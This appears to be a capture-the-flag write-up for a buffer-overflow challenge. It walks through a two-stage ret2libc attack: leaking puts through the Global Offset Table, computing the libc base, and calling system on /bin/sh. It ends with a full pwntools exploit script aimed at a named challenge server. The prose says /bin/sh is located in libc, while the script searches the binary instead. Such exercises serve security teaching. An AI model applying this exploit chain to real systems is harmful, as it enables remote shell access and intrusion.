## Dusty Scrolls - BOF and ret2libc

When examining the executable `ret2libc_leak` and its corresponding source code, an analyst discovers a vulnerability where the application requests a book title and subsequently overflows a constrained 64 byte buffer. However, unlike the previous environment, the `system` function is completely absent from the Procedure Linkage Table.

Because the `system` function was never explicitly imported or utilized by the original programmer, the compiler omits its resolution stub entirely. Consequently, an attacker cannot simply redirect execution to a localized stub. Instead, the exploitation strategy must pivot toward a dynamic approach where the attacker intentionally leaks a runtime memory address belonging to the standard C library, mathematically calculates the foundational base address of that library, and subsequently redirects execution directly to the `system` function residing securely within the external library space.

### The Two Stage Execution Methodology

To achieve arbitrary code execution under these restrictive conditions, an attacker must deploy a sophisticated two stage strategy. The primary obstacle is that Address Space Layout Randomization ensures the C library resides at a different memory location upon every execution. However, the internal offsets between functions within the same compiled library remain absolutely static.

The first stage focuses entirely on information disclosure. The program contains a Procedure Linkage Table entry for the `puts` function, which the attacker can weaponize. By seizing control of the instruction pointer, the attacker constructs a payload that passes the Global Offset Table entry of `puts` as an argument to the `puts` function itself. When executed, the program will print the fully resolved, randomized runtime address of `puts` to the standard output stream.

> Crucially, the execution flow must not terminate after this disclosure. The final instruction of this first stage payload must return execution directly back to the `main` function, effectively restarting the vulnerable application state while retaining the active, randomized memory layout.

The second stage transitions from information disclosure to weaponization. Once the attacker captures the leaked memory address, they subtract the known static symbol offset of `puts` to reveal the definitive base address of the C library. With the base address mathematically confirmed, the attacker calculates the precise runtime locations of both the `system` function and the `/bin/sh` string. A second payload is then transmitted to the newly restarted vulnerable buffer, constructing a standard Return Oriented Programming chain that populates the first argument register with the string and invokes the calculated `system` address.

### Stack Layout Visualization and Payload Construction

Visualizing the stack during these precise moments is critical for a comprehensive understanding of the attack chain. During the first stage, the stack is corrupted sequentially. Following the initial padding required to reach the return address, the attacker places the address of a `pop rdi; ret` gadget. Immediately above this gadget, the attacker places the memory address of the `puts` Global Offset Table entry. When the gadget executes, this entry address is popped directly into the RDI register. The subsequent stack value contains the address of the `puts` Procedure Linkage Table stub, which then executes and prints the runtime address. Finally, the stack contains the address of the `main` function, ensuring the program loops back gracefully.

During the second stage, the stack layout mirrors a standard execution chain. Following the padding, an attacker often inserts an isolated `ret` gadget to ensure strict 16 byte stack alignment, which prevents multimedia instruction crashes within the `system` function. This is followed by the `pop rdi; ret` gadget, the dynamically calculated address of the `/bin/sh` string, and finally the dynamically calculated address of the `system` function.

### Programmatic Exploitation and Offset Resolution

The following complete script demonstrates the programmatic implementation of this two stage technique. It utilizes the `pwntools` framework to handle the network streams, parse the leaked memory addresses, and construct the precise payloads required to bypass the randomization mitigations.



```Python
#!/usr/bin/env python3  
from pwn import *  
  
context.binary = exe = ELF('./ret2libc_leak', checksec=False)  
libc = ELF('./libc.so.6', checksec=False)  
  
HOSTNAME = 'offsec.m0lecon.it'  
PORT = 13520  
  
OFFSET_TO_RIP = 72  
  
  
def conn():  
    if args.LOCAL:  
        return process(exe.path)  
    return remote(HOSTNAME, PORT)  
  
  
def main():  
    p = conn()  
  
    POP_RDI = exe.sym.pop_rdi_ret  
    RET = ROP(exe).find_gadget(['ret']).address  
    PUTS_PLT = exe.plt['puts']  
    PUTS_GOT = exe.got['puts']  
    MAIN = exe.sym['main']  
    BINSH = next(exe.search(b'/bin/sh\x00'))  
  
    p.recvuntil(b'looking for?\n')  
    stage1 = flat(  
        b'A' * OFFSET_TO_RIP,  
        p64(POP_RDI),  
        p64(PUTS_GOT),  
        p64(PUTS_PLT),  
        p64(MAIN)  
    )  
    p.send(stage1)  
    p.recvline()  
  
    leaked = p.recvline().strip()  
    leak_puts = u64(leaked.ljust(8, b'\x00'))  
    log.info(f"puts leak = {leak_puts:#x}")  
  
    libc.address = leak_puts - libc.symbols['puts']  
    log.info(f"libc base = {libc.address:#x}")  
  
    system_addr = libc.symbols['system']  
  
    p.recvuntil(b'looking for?\n')  
    stage2 = flat(  
        b'A' * OFFSET_TO_RIP,  
        p64(RET),  
        p64(POP_RDI),  
        p64(BINSH),  
        p64(system_addr)  
    )  
    p.send(stage2)  
    p.interactive()  
  
  
if __name__ == '__main__':  
    main()
```